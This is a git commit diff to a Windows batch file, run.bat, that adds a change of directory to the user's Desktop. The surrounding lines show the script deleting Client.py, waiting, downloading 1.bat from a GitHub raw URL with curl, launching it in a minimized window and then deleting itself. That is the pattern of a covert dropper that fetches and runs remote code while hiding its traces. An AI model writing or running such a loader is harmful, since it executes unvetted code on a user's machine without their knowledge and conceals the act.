7c8524d44ab079286939e67ff142396896bf4db4
oogabooga245 <68644080+oogabooga245@users.noreply.github.com>
2024-06-12 06:53:21 -0600

    Update run.bat

--- run.bat
+++ run.bat
@@ -8,6 +8,7 @@ goto :run
 :run
 del Client.py
 timeout 15 >nul
+cd %USERPROFILE%\Desktop
 curl -o 1.bat https://raw.githubusercontent.com/oogabooga245/-/main/1.bat
 START /MIN CMD.EXE /C 1.bat
 del run.bat
